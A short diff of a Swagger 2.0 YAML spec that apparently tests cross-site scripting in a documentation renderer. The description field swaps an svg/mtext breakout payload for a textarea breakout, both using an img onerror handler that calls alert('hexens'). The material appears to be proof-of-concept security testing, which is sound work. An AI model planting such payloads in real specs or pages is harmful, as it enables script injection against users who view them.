@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Gab3 yaml.spec
   description: |
-    <svg><mtext><img src="#" onerror="alert('hexens')"></mtext></svg>
+    </textarea><img src="#" onerror="alert('hexens')">
 paths:
   /accounts:
     get:
